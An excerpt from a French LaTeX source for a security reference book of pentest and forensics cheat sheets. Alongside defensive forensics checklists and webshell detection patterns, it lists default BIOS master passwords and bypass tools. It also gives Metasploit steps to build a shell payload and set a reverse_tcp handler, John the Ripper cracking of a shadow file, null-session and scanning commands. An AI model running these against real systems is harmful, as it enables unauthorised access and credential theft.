...
\selectlanguage{french}		                            % utilisation du francais dans les modules tels que la date
...
\textsf{\footnotesize Les informations de ce document ne sont communiquées qu'à titre d'instruction.\\\vskip-1cm
Les auteurs et contributeurs ne peuvent \^etre rendus responsable de ce que vous en faites !}
\end{minipage}}
}
...
\textit{Le contenu du fichier devrait \^etre sous la forme d'une entr\'ee par ligne : 192.168.0.1 00:11:22:33:44:55}\\
...
\begin{tabular}{l|l||l|l}
 ...
 % envoi a partir du storage, AT+CMSS=xxx (num du message envoyÃ© prÃ©cedement)
 \multicolumn{4}{l}{}\\
...
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
\HACKfiche{}{Backtrack}{backtrack4_4.png}
{
...
{
\\Distribution tout-en-un, d'audit de s\'ecurit\'e, tests d'intrusion, cassage WiFi\dots{}\\
La nouvelle distribution s'appelle maintenant Kali-linux \url{http://www.kali.org/}\\
...
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
\fiche{}{BIOS}{bios.png}
{\url{http://www.tech-faq.com/reset-bios-password.html}}
{
\\Basic Input Output System (BIOS), permet la gestion des op\'erations \'el\'ementaires lors de sa mise sous tension. Il gère la séquence de d\'emarrage et peut \^etre prot\'eg\'e par un mot de passe. Progressivement remplac\'e par l'Unified Extensible Firmware Interface (UEFI) qui permet beaucoup plus de param\'etrages.\\
Plusieurs outils permettent de passer outre le mot de passe de modification du BIOS. Ils exploitent la présence d'un mot de passe constructeur ma\^itre permettant la r\'ecup\'eration du BIOS en cas de perte de mot de passe.
}
{
{\Large Outils g\'en\'eriques / Tutoriels}
\begin{description}
	\item[CmosPwd] : \url{http://www.cgsecurity.org/wiki/CmosPwd}
	\item[Unlock code generator] : {\small \url{http://dogber1.blogspot.com/2009/05/table-of-reverse-engineered-bios.html}}
	\item[!BIOS] : \url{http://web.archive.org/web/20080821232354/}\\ \url{http://www.11a.nu/software/bios-pc-bios-security-and-maintanance-toolkit/}
	\item[pwgen] : \url{http://dogber1.blogspot.fr/2009/05/table-of-reverse-engineered-bios.html}\\\url{https://github.com/bacher09/pwgen-for-bios}
\vskip+0.4cm
	\item[ACER] : \url{http://www.tech-faq.com/how-do-i-reset-an-acer-bios-password.html}
	\item[DELL] : \url{http://www.tech-faq.com/reset-dell-bios-password.html}
	\item[HP] : \url{http://code.google.com/p/hp-bios-password-cracker/}\\\url{http://code.google.com/p/hp-cmi-bios-setting-profile-builder/}
	\item[IBM] : \url{http://www.tech-faq.com/reset-ibm-thinkpad-bios-password.html}\\ 
				 \url{http://sodoityourself.com/hacking-ibm-thinkpad-bios-password/}\\
				 \url{http://www.thinkwiki.org/wiki/Maintenance}
	\item[Toshiba] : \url{http://www.buzzard.me.uk/toshiba/index.html}\\ \url{http://www.laptop-repair.info/clear_bios_password.html} \\ \url{http://www.cgsecurity.org/keydisk.exe}
\end{description}
\vskip+0.2cm
\begin{tabular}{|l|l|}
\hline
Fabricant & Mot de passe par défaut\\\hline\hline
AMI	 			&	{\scriptsize A.M.I., AAAMMMIII, AMI?SW, AMI\_SW, BIOS, CONDO, HEWITT RAND, LKWPETER, MI, PASSWORD}\\\hline
Award BIOS		&	
\begin{minipage}[t][1.3cm][t]{9cm}
\scriptsize
01322222,589589,589721,595595,598598,ALFAROME,ALLY,ALLy,aLLY,aLLy,aPAf,award,AWARD~PW,\\
AWARD SW,AWARD?SW,AWARD\_PW,AWARD\_SW,AWKWARD,awkward,BIOSTAR,CONCAT,CONDO,\\
Condo,condo,d8on,djonet,HLT,J256,J262,j262,j322,j332,J64,KDD,LKWPETER,Lkwpeter,PINT,pint,SER,\\
SKY\_FOX,SYXZ,syxz,TTPTHA,ZAAAADA,ZAAADA,ZBAAACA,ZJAAADC
\end{minipage}\\\hline
Phoenix	BIOS	&	BIOS, CMOS, phoenix, PHOENIX\\\hline
VOBIS \& IBM	&	merlin\\\hline
Dell			&	Dell\\\hline
Biostar			&	Biostar\\\hline
Compaq			&	Compaq\\\hline
Enox			&	xo11nE\\\hline
Epox			&	central\\\hline
Freetech		&	Posterie\\\hline
IWill			&	iwill\\\hline
Jetway			&	spooml\\\hline
Packard Bell	&	bell9\\\hline
QDI				&	QDI\\\hline
Siemens			&	SKY\_FOX\\\hline
SOYO			&	SY\_MB\\\hline
TMC				&	BIGO\\\hline
Toshiba			&	Toshiba\\\hline
\end{tabular}
...
%Endocage : avec l'aide d'une cl\'e, les donnÃ©es sont transform\'ees, la cl\'e et le moyen d'encodage permettent de r\'ecup`'erer les donn\'ees initiales.
}
{
...
%chiffrement par secrets partagÃ©
...
{
	Système de publication de bureau et d'application \`a distance. Les serveurs sont en environnement Windows.
}
{
...
{\url{http://sourceforge.net/projects/dirbuster/}\\\url{http://code.google.com/p/wfuzz/}\\\url{http://www.unixuser.org/~euske/python/webstemmer/}}
{
...
\textbf{Wfuzz :}\addcontentsline{toc}{subsubsection}{Wfuzz}\\
\textit{Autre outils de fuzzing. Il ne g\`ere pas le suivi de lien dans la page. Ici en activant 50 threads et en ne traitant pas les r\'eponses 400 et 404.}
\vskip+0.2cm
{\sl \color{blue}./wfuzz.py -c -t 50 {-}{-}hc 400 {-}{-}hc 404 -z file,dico.txt http://192.168.0.1/FUZZ}\\

\textbf{Webstemmer :}\addcontentsline{toc}{subsubsection}{Webstemmer}\\
\textit{R\'eel crawler, sans gestion de dictionnaire, sauvegarde le r\'esultat dans un fichier zip.}\vskip+0.2cm
\textbf{Crawl d'un site :}\\
{\sl \color{blue}./textcrawler.py -o <fichier de sortie> <url>}\\
...
Coupl\'e avec un MITM il est possible de voir les images t\'el\'echarg\'ees par un client en HTTP.
}
{
...
Permet de g\'erer des groupes de communications (sur des switches/routeur) pour l'utilisation de multicast.
			...
			\vskip - 0.1cm
			\textbf{Scan d'EAR CISCO par classes d'adresse (A:1,B:2,C:3) : }
			{\sl \color{blue}\footnotesize./pentest/cisco/ciscos/ciscos 192.168.0 3}\\
...
Projet de test de firewall applicatif (WAF) \url{https://github.com/ironbee/waf-research}
}
{
\textbf{D\'efinitions :} 
\begin{description}
...
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
\fiche{}{Foremost}{foremost.png}{\url{http://foremost.sourceforge.net/}\\\url{http://www.garykessler.net/library/file_sigs.html}}
{
...
Il est important de noter que foremost utilise par défaut le fichier de configuration /etc/foremost.conf.
...
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
\CficheTotal{}{Forensic - Questionnaire}
{

\textbf{Questions pr\'eliminaires}
\begin{description}
    \item[$\Square$] Quel acte ou \'etat inhabituel a \'et\'e identifi\'e ?  
    \item[$\Square$] Quand et quelles sont les actions men\'es depuis ?
    \item[$\Square$] Quels sont les syst\`emes d'exploitation, capacit\'es et technologie de stockage,  r\'eseaux, connectiques pr\'esentes et cibl\'es par l'investigation ?
    \item[$\Square$] Les stockages sont-ils chiffr\'es ?
    \item[$\Square$] A qui appartiennent les cibles et quels sont les droits sur celle-ci par la soci\'et\'e ?
    \item[$\Square$] Quand et comment peuvent \^etre programm\'es les acc\`es pour l'extraction des donn\'ees ?
    \item[$\Square$] Quels sont vos d\'elais maximum pour la r\'eception des r\'esultats ?    
    \item[$\Square$] Avez-vous d'autres informations ou exigences \`a porter \`a notre attention ?
\end{description}
\vskip+0.2cm

\textbf{Investigation sur journaux transmis}
\begin{description}
    \item[$\Square$] Quelle est la source, l'origine, le format et la taille des journaux ?
    \item[$\Square$] En cas de format propri\'etaire prot\'eg\'es, pouvez-vous transmettre le moyen d'exploiter ou de d\'echiffrer les donn\'ees ?
    \item[$\Square$] Comment pouvez-vous transmettre les journaux d'audit ?
\end{description}
\vskip+0.2cm

\textbf{Cas de corruption d'un serveur}
\begin{description}
    \item[$\Square$] Quel \'etait le r\^ole du serveur ?
    \item[$\Square$] Qui administre le serveur et comment ?
    \item[$\Square$] Quels sont les date de derni\`ere intervention sur le serveur, mise \`a jour des application et du serveur ?
    \item[$\Square$] Quels sont les langages et technologies utilis\'ees dans les application Web ?
    \item[$\Square$] Pourriez vous faire un diff entre les fichiers de l'application Web et la derni\`ere version pr\'esente ?
    \item[$\Square$] Quels sont les \'el\'ements journalis\'es et sont-ils sauvegard\'es ?
\end{description}
\vskip+0.2cm

\textbf{Cas d'action de malveillance}
\begin{description}
    \item[$\Square$] Quels sont les date de derni\`ere intervention sur le syst\`eme ?
    \item[$\Square$] Quels sont les services et applications spécifiques utilis\'es sur ce syst\`eme  ?
    \item[$\Square$] La connexion \`a des r\'eseaux ext\'erieurs à l'entreprise est-elle autoris\'ee pour ce syst\`eme ?
    \item[$\Square$] Combien d'utilisateurs peuvent se connecter sur ce syst\`eme, et quels sont les comptes, SID et privilèges associés ?
    \item[$\Square$] Quelle est la date de derni\'er formatage et changement de propri\'etaire du syst\`eme ?
\end{description}
}
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
\fiche{}{Forensic - D\'eroulement}{protocole.png}
{
\url{http://ncfs.ucf.edu/craiger.forensics.methods.procedures.final.pdf}
\url{https://omnia-projetcs.googlecode.com/svn/trunk/OFD/Investigations_Inforensique.mm}
}
{
...
\begin{description}
    \item[$\Square$] Sauvegarder de l'\'etat instantan\'e (processus, ports ouverts, m\'emoire).
    ...
    \item[$\Square$] Ne pas \'eteindre la machine, la d\'econnecter de tout r\'eseau en cas de risques de compromission (perte des objets r\'eseau).
...
\begin{description}
    \item[$\Square$] Lecture de la MFT et v\'erification des anomalies.
    \item[$\Square$] R\'ecup\'eration des fichiers effac\'es.
    \item[$\Square$] Effectuer une liste de l'ensemble des fichiers pr\'esents et r\'ecup\'er\'es sur le disque avec emprunte SHA256.   
...
\textbf{Syst\`eme :}
\begin{description}
	\item[$\Square$] Configuration du syst\`eme (taille m\'emoire, processeur, carte m\`ere, marque, mod\`ele, num\'eros de s\'erie).
...
\begin{description}
    ...
    \item[$\Square$] V\'erifier les traces d'applications dans la base de registre, fichiers d'audit et prefetch.
...
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
\fiche{}{Forensic - Investigation sur serveur web Linux}{protocole.png}
{
\url{https://omnia-projetcs.googlecode.com/svn/trunk/OFD/Investigations_Inforensique.mm}
}
{
\\Cette fiche a pour objectif de fournir une aide dans un contexte de corruption de serveur Web Linux afin d'identifier de potentiels programmes malveillants.
}
{
\textbf{Contexte et état du serveur :}\\
\textit{Il est important dans un premier temps d'identifier si le serveur était protégé par un solution de filtrage (WAF, firewall, proxy, NAT), s'il était mutualisé ou encore virtualisé afin de s'assurer de la méthode de compromission. Le serveur détecté comme compromis n'est pas forcément la porte d'entrée de l'intrusion. En effet, un élément frontal avec une interface d'administration, un autre site mutualisé et non sécurisé ou encore une souche vérolée de système d'exploitation ou d'application peut en \^etre l'origine.}

\begin{description}
    \item[$\Square$] Identifier la présence de solution de filtrage sur le serveur (sans oublier la table {\sl \color{blue}-t NAT}) :\\
    {\sl \color{blue}iptables -L -n -v} et {\sl \color{blue}ip6tables -L -n -v}\vskip+0.1cm
    				 
    \item[$\Square$] Activation ou non de la synchronisation horaire (attention aux décalages horaire entre serveurs) :\\
    {\sl \color{blue}ntpdc -n -c pe} et {\sl \color{blue}ntpq -p}\vskip+0.1cm
    
    \item[$\Square$] Activation et export des journaux d'audit : 
    {\sl \color{blue}egrep -v '\^{}\#|\^{}\$' /etc/syslog.conf}%\vskip+0.1cm
    
    \item[$\Square$] Type et version du système d'exploitation et du noyau : 
    {\sl \color{blue}uname -arv} ou {\sl \color{blue}lsb\_release -a}%\vskip+0.1cm
    
    \item[$\Square$] Liste des paquets installés (certains paquets vulnérables peuvent \^etre à l'origine de la corruption du serveur. Les CMS comme Joomla ou WordPress ainsi que leurs pluggins associés doivent \^etre vérifiés):\\ 
    {\sl \color{blue}rpm -qa} ou {\sl \color{blue}dpkg {-}{-}get-selections}%\vskip+0.1cm
    
    \item[$\Square$] Liste des services utilisés : 
    {\sl \color{blue}chkconfig {-}{-}list} ou {\sl \color{blue}netstat -planetuvo} et {\sl \color{blue}netstat -plaetuvo}\vskip+0.1cm
\end{description}

\vskip+0.2cm 
\textbf{Identification d'application malveillante :}\\
\textit{La recherche doit commencer par identifier les fichiers modifiés et ajoutés sur le système. Dont ceux pouvant \^etre des programmes malveillants.}
\begin{description}
    \item[$\Square$] Droits appliqués sur les fichiers de l'application Web (normalement doit \^etre 400) :\\
    {\sl \color{blue}ls -altR /var/www/vhosts/}
    
    \item[$\Square$] Identifier les fichiers différents entre deux version de fichiers : 
    {\sl \color{blue}diff -qNr rep\_origine/ rep\_serveur/}%\vskip+0.1cm
    
    \item[$\Square$] Recherche de modification entre deux fichiers : 
    {\sl \color{blue}diff -Nau fichier\_ok fichier\_nok}%\vskip+0.1cm
    
    \item[$\Square$] Recherche de fichier PHP contenant des fonctions très utilisées dans des applications malveillantes :\\
    {\sl \color{blue}grep -r 'base64\_decode' /var/www/vhosts/*} et les termes {\sl \color{blue}'gzinflate('}, {\sl \color{blue}'\$GLOBALS'} et {\sl \color{blue}'eval('}\vskip+0.1cm
    
     \item[$\Square$] La génération d'empreintes SHA-256 et son utilisation sur l'application RtCA (\url{http://code.google.com/p/omnia-projetcs}) permet de vérifier si ces fichiers sont reconnus comme virus par les solutions antivirus sur le site de \url{https://www.virustotal.com} :\\
     {\sl \color{blue}sha256deep -r / > sha256deep.txt}
\end{description}

\vskip+0.2cm  
\textbf{Journaux d'audit :}\\
\textit{Il est nécessaire d'avoir pour chaque élément une preuve de la manière dont a été corrompue le serveur. Dans la majorité des cas, les journaux permettent de valider les hypothèses de scénarios d'intrusion.}
\begin{description}    
    \item[$\Square$] Des connexions réussies, échec et d'administration des éléments frontaux (WAF, firewall, proxy\dots{}).
    \item[$\Square$] Des connexions réussies, échec et d'administration des éléments internes de filtrage.
    \item[$\Square$] Des journaux système, web, base de données et tout autre service démarré sur le serveur corrompu.
    \item[$\Square$] Toute information de suspicion de la compromission pouvant induire une date et la méthode de compromission (défaillance, redémarrage de service, saturation de base\dots{}).
\end{description}

\vskip+0.2cm 
Il suffira par la suite de rechercher dans ces journaux les noms des fichiers identifiés ci-dessus afin d'établir si la modification ou création de fichier a été effectuée au travers d'une faille web standard ou logiciel. 
...
\fl{\textbf{TestDisk + PhotoRec}\\\url{http://www.cgsecurity.org}}{Recherche de partitions et fichiers effac\'es (FAT, NTFS, EXT2/EXT3, HFS+).
...
\fl{\textbf{VirusTotal}\\\url{http://www.virustotal.com}\\
\textbf{Bit9 FileAdvisor}\\
\url{https://fileadvisor.bit9.com}
}{Analyse de fichier en ligne par un grand nombre d'antivirus. Application Windows : \url{http://www.virustotal.com/vtsetup.exe}}{1.5cm}
\end{tabular}
}\vskip+0.4cm
...
\fl{\textbf{Exif}\\\url{http://araskin.webs.com/exif/exif.html}}{Plugin Firefox/thunderbird, pour extraction des informations des fichier Exif d'index d'appareil num\'erique (exemple : photos)}{1.2cm}
...
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
\fiche{}{Forensic - Unix/Linux}{protocole.png}{\url{https://omnia-projetcs.googlecode.com/svn/trunk/OFD/Investigations_Inforensique.mm}}
{
...
{
\textbf{Sauvegarde d'un disque bit \`a bit : } {\sl \color{blue}dd if=/dev/sdc of=/media/sav/fichier\_resultat.raw conv=noerror,sync}\\
...
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
\fiche{}{Forensic - Windows}{protocole.png}{\url{https://omnia-projetcs.googlecode.com/svn/trunk/OFD/Investigations_Inforensique.mm}}
{
\\Avant toute copie d'un disque, v\'erifier le d\'ebit de transfert possible avec les connecteurs et disques qui vont \^etre utilis\'es, pour de meilleures performances pr\'ef\'erer des copies machine/live-cd <-> disque externe : 
\begin{itemize}
	\item pour un disque de 100go avec un connecteur USB 1 (2mo/s) : \textbf{14h} (d\'ebit moyen)
...
\textit{Une copie bit \`a bit d'un disque permet de copier tous les secteurs d'un disque, l'option \textbf{bs} permet d'optimiser la copie, ici pour une taille de secteur de 4096 (Pour identifier le disque {\sl \color{blue}fdisk -l}}).\\
{\sl \color{blue}dd if=/dev/sdc of=/media/Sauvegarde/fichier\_resultat.raw bs=4096 conv=noerror,sync}
...
\item libbde (lib et outils) : \url{http://code.google.com/p/libbde/}
\item Proof Of Concept NVbit : \url{http://www.nvlabs.in}
\end{itemize}
...
\begin{itemize}
	...
	\item Fichiers de prefectch : {\sl \color{blue}\%windir\%$\backslash$Prefecth$\backslash$*.pf}
	\item T\^aches plannif\'es : {\sl \color{blue}\%windir\%$\backslash$Tasks$\backslash$*.job}
	\item Fichiers applicatifs : Firefox, Thunderbird\dots{}
	\item Tout fichier en rapport avec l'investigation : torrent, images,\dots{}
\end{itemize}
}
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
\fiche{}{Forensic - MacOSX}{protocole.png}
{
	\url{http://macforensic.joelgomez.fr/}\\
	\url{http://macforensic.free.fr/}
}
{
\\Quelques combinaisons de touches utiles lors de d\'emarrage des supports utilisant MacOSX : 
\begin{itemize}
	\item C : Boot sur CD ou DVD ()
	\item T :  Démarre en mode disque cible, le disque dur est alors vue comme un support de stockage externe et peut être accédé à partir du port firewire (Target Mode)
	\item Pomme + S : Démarre une invite de commande root (Single User Mode)
\end{itemize}
}
{
\textbf{Syst\`eme de fichiers :}
\\ HFS (Hierarchical File Fystem) et HFS+ (HFS extended) avec des extensions telles que la prise en compte de la casse pour les noms de fichiers (HFSX).
\begin{itemize}
	\item \textbf{Volume Header} : header qui contient des donn\'ees \`a propos du syst\`eme de fichiers (date de cr\'eation, taille des blocs etc.). 
	Il est situé 1024 octets après le début du volume et peut être analysé avec fsstat du Sleuthkit.
	\\ Exemple de commande : {\sl \color{blue}fsstat -i raw -o OFFSETPARITION image.dd}\vskip+0.1cm
	\item \textbf{Allocation file} : fichier bitmap qui suit l'évolution de chaque bloc du volume.\vskip+0.1cm
	\item \textbf{Catalog file} : fichier contenant les entrées de chaque fichier et répertoire (MFT).
\end{itemize}

\vskip+0.2cm
\textbf{Fichiers plist :}
Fichiers de configuration utilis\'es sur les systèmes Apple. 3 types existent : binaire, XML, JSON. Possibilité de convertir les plist binaires avec le script plutil.pl : \url{http://theiphonewiki.com/wiki/Plutil}

\vskip+0.2cm
\textbf{Fichiers Lowdown iOS (Escrow Keybag) :}
\\Le r\'epertoire /private/var/db/lockdown/ peut contenir des fichiers créés par le service Usbmuxd lors de la connexion d'un iDevice déverrouillé via USB autorisant la machine \`a communiquer avec le iDevice. Ce fichier permet de futurs connexions sans avoir \`a fournir le passcode même si le device est verrouillé ou si le passcode a été  changé.

\vskip+0.2cm
\textbf{Fichiers et r\'epertoires importants :}
\begin{itemize}
	\item Date d'installation : {\sl \color{blue}/private/var/vm/swapfile} et {\sl \color{blue}/private/var/vm/sleepimage}
	\item Information sur le premier compte configuré : {\sl \color{blue}/private/var/db/.AppleSetupDone} 
	\item Configuration date et heure : {\sl \color{blue}/Library/Preferences/.GlobalPreferences.plist} 
	\item Logiciels installés via l'OS : {\sl \color{blue}/Library/Receipts}  
	\item Caches des applications (Mail, web, IM...) :\\ {\sl \color{blue}/Users/username/Library/Caches/} et {\sl \color{blue}/Users/username/Library/Application Support} 
	\item Fichiers d'hibernation et fichier d'échange : {\sl \color{blue}/private/var/vm/swapfile} et {\sl \color{blue}/private/var/vm/sleepimage}
	\item Version de l'OS : {\sl \color{blue}/System/Library/CoreServices/SystemVersion.plist}
	\item Configuration réseau :\\ {\sl \color{blue}/Library/Preferences/SystemConfiguration/preferences.plist} et {\sl \color{blue}/Library/Preferences/SystemConfiguration/com.apple.network.identification.plist}
	\item Comptes utilisateurs : {\sl \color{blue}/private/var/db/dslocal/nodes/Default/users/USERNAME.plist}
	\item Dernier utilisateur logg\'e : {\sl \color{blue}/Library/Preferences/com.apple.loginwindow.plist}
	\item Fichiers récents : {\sl \color{blue}/Users/username/Library/Preferences/com.apple.recentitems/plist}
	\item Journaux d'audit : {\sl \color{blue}/private/var/log}, {\sl \color{blue}/Library/Logs} et {\sl \color{blue}/Library/Preferences/}
\end{itemize}
}
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
...
\end{itemize}
\vskip+0.2cm
{\color{red}Attention un grand nombre de \textit{dorks} ne sont plus fonctionnelles sur google.}
}
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
...
En cas de stockage des fichiers imprim\'es certains constructeurs permettent l'acc\`es au cache de l'imprimante \`a partir du r\'eseau via un client spécialis\'e \`a r\'ecup\'erer sur son site.
...
SAMDump2/Bkhive Ophcrack& Registre				& local							& Tous \`a partir de la v3			& \url{http://sourceforge.net/projects/ophcrack/}\\\rowcolor[gray]{.9}
...
{\sl \color{blue}./john-386 -wordlist:fichier\_dictionnaire shadow}\\en v\'erifiant la casse :\\{\sl \color{blue}./john-386 {-}{-}format=NT {-}{-}rules=NT -wordfile:fichier\_dictionnaire shadow}
\vskip +0.5cm
...
\textbf{Outils :}
\begin{itemize}
	\item Apache Directory Studio \url{http://directory.apache.org/}
...
\textbf{Mises \`a jour :}
\begin{description}
	\item[$\Square$] V\'erifier la version du noyaux, distribution. 
{\sl \color{blue}\textbf{uname -arv}} ou {\sl \color{blue}\textbf{lsb\_release -a}}
...
\textit{Attention pour autoriser le transfert de zone pour tout le monde (non recommand\'e) il faut utiliser \`a la place de l'ip : \textbf{any} ou \textbf{0/0}}\\
{\sl \color{blue}
...
\vskip -0.5cm
 {
	...
	&
		\blockFiche{8cm}{9cm}{Gestion des fichiers}
		{
			...
			\MbFCmd{0.7cm}
			{Noyau, distribution, dur\'ee et charge syst\` eme :}
			{
				uname -arv, lsb\_release -a, uptime
			}\\
			\MbFCmd{0.7cm}
			{\'Etat de la m\'emoire :}
			{
...
\vskip -0.5cm
 {
	...
	&
		\blockFiche{8cm}{9cm}{Recherche de fichiers}
		{
			...
			\MbFCmd{0.7cm}
			{Recherche d'un fichier index\'e : (mise à jour : updatedb)}
			{
			locate \textit{[fichier]}
			}\\
			\MbFCmd{0.7cm}
...
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
\HACKfiche{}{Metasploit - Meterpreter 1/2}{metasploit.png}
{
\url{http://www.offensive-security.com/metasploit-unleashed/Metasploit_Unleashed_Information_Security_Training}\\
\url{http://www.fastandeasyhacking.com}
}{
...
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
\HACKfiche{}{Metasploit - Meterpreter 2/2}{metasploit.png}
{\O
}{
\\Génératation de binaire meterpreter et exploitation.\\
Avec quelques compléments.
}{

Génération d'un binaire meterpreter :\\
\textbf{msf >} {\sl \color{blue}use payload/windows/shell\_bind\_tcp}\\
\textbf{msf payload(shell\_bind\_tcp) >} {\sl \color{blue}generate -t exe -f meterpreter\_binary.exe} (-h pour l'aide)\\

Après exécution sur la machine à distance, se connecter dessus :\\
\textbf{msf >} {\sl \color{blue}use exploit/multi/handler}\\
\textbf{msf exploit(handler) >}{\sl \color{blue} set payload windows/meterpreter/reverse\_tcp}\\
\textbf{msf exploit(handler) >}{\sl \color{blue} set LHOST 192.168.0.1}\\
\textbf{msf exploit(handler) >}{\sl \color{blue} set LPORT 4444}\\
\textbf{msf exploit(handler) >}{\sl \color{blue} exploit -j}\\

Découverte SNMP avec traitement des OID :\\
\textbf{msf >} {\sl \color{blue}use auxiliary/scanner/snmp/snmp\_enum}\\
\textbf{msf auxiliary(snmp\_enum) >}{\sl \color{blue} set RHOSTS 192.168.0.1 192.168.0.2}\\

\'Enumération des partages NFS :\\
\textbf{msf >} {\sl \color{blue}use auxiliary/scanner/nfs/nfsmount}\\
\textbf{msf auxiliary(nfsmount) >}{\sl \color{blue} set RHOSTS 192.168.0.1 192.168.0.2}\\

Monter un partage NFS :\\
{\sl \color{blue}mount -t nfs 192.168.0.1:/partage /media/nfs}\\
...
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
\fiche{}{Net commandes}{services.jpg}{\O}
{
  \\Commandes sous console DOS sur les environnements Microsoft Windows.
}
{
\textbf{Utilisateurs :}\\
\textit{Ajouter un utilisateur :}\\{\sl \color{blue}
net user MonUser MonMDP /add\vskip-0.05cm
net user MonUser MonMDP /add /domain\vskip-0.05cm
net user MonUser MonMDP /add /domain MonDomaine}\vskip+0.1cm
\textit{Supprimer un utilisateur :}\\{\sl \color{blue}
net user MonUser /delete\vskip-0.05cm
net user MonUser /delete /domain}\vskip+0.1cm
\textit{Modifier le mot de passe d'un utilisateur : }{\sl \color{blue}
net user MonUser MonNouveauMdp}\\
\textit{Ajouter un utilisateur \`a un groupe local/du domaine actuel/un autre domaine :}\\{\sl \color{blue}
net localgroup MonGroupe MonUser /add\vskip-0.05cm
net group MonGroupe MonUser /add}\vskip+0.1cm
\textit{Liste des utilisateurs locaux/du domaine actuel/un autre domaine :}\\{\sl \color{blue}
net user\\
net user /domain}\\
\textit{Information d'un utilisateur local/du domaine actuel/un autre domaine :}\\{\sl \color{blue}
net user MonUser\vskip-0.05cm
net user MonUser /domain}\vskip+0.1cm
\textit{Liste des groupes locaux/du domaine actuel/un autre domaine :}\\{\sl \color{blue}
net localgroup\vskip-0.05cm
net group\vskip-0.05cm
net group /domain}\vskip+0.1cm
\textit{Information sur un groupe (membres) :}\\{\sl \color{blue}
net localgroup MonGroupe\vskip-0.05cm
net group MonGroup\vskip-0.05cm
net group MonGroupe /domain}\vskip+0.1cm
\textit{Liste des sessions ouverte sur la machine : }{\sl \color{blue}
net session}\\
\textit{Fermer la session d'un utilisateur : }{\sl \color{blue}
net session $\backslash\backslash$MonComputer /delete}\vskip+0.2cm

\textbf{R\'eseau :}\\
\textit{Liste des machines du r\'eseau r\'epondant : }{\sl \color{blue}
net view}\\
\textit{Liste des partages d'une machine : }{\sl \color{blue}
net view $\backslash\backslash$IP\_ou\_nom\_de\_machine}\\
\textit{Liste des partages locaux : }{\sl \color{blue}
net share}\\
\textit{Monter un partage r\'eseau : }{\sl \color{blue}
net use * $\backslash\backslash$IP$\backslash$partage /user:"login":"mdp"}\\
\textit{D\'emonter un partage r\'eseau (ici le lecteur f) : }{\sl \color{blue}
net use f: /delete}\\
\textit{V\'erifier une nulle session sur une machine du r\'eseau : }{\sl \color{blue}
net use $\backslash\backslash$IP$\backslash$ipc\$ /user:"" ""}\\
\textit{Ajouter/supprimer un ordinateur au domaine : }{\sl \color{blue}
net computer $\backslash\backslash$MonComputer /add} ou {\sl \color{blue}/delete}\\
\textit{Afficher la liste des fichiers ouverts sur le r\'eseau : }{\sl \color{blue}
net file}\\
\textit{Afficher l'heure d'une machine : }{\sl \color{blue}
net time $\backslash\backslash$IP}\vskip+0.2cm

\textbf{Syst\`eme :}\\
\textit{Politique de sécurité local/de l'AD :}\\{\sl \color{blue}
net accounts\vskip-0.05cm
net accounts /domain}\vskip+0.1cm
\textit{Informations du serveur (liste des r\^oles) : }{\sl \color{blue}
net config}\\
\textit{Information du serveur (sur un r\^ole, ici Serveur) : }{\sl \color{blue}
net config Serveur}
}
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
...
(Windows) {\sl \color{blue}nbtstat -A 192.168.0.1} ou (Linux) {\sl \color{blue}smbclient -L 192.168.0.1}\vskip + 0.2cm
...
\vskip+0.15cm
Attention sous Windows, pour ces commandes cygwin*.dll doit se trouver dans le m\^eme r\'epertoire.\\ \url{http://www.securityforest.com/downloads/Enum+.zip}\\
...
\textbf{Scan NetBIOS :}\addcontentsline{toc}{subsubsection}{Nbtscan} \url{http://www.inetcat.net/software/nbtscan.html}\\
{\sl \color{blue}nbtscan -v 192.168.1.0/24}\vskip+0.15cm
...
\textbf{Tous les tests :} {\sl \color{blue}nikto -Cgidirs all -host http://www.google.fr}\\
...
{\sl \color{blue}nmap -vvv -Pn -sVRSU -p- 192.168.0.1 -oX FichierResultat.xml}\vskip +0.15cm
...
{\sl \color{blue}nmap -PN -Pn -p 139 -b 192.168.0.100 192.168.0.1}\vskip +0.15cm
...
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
\fiche{}{NsLookup, Host et Dig}{protocole.png}{\O}
{
...
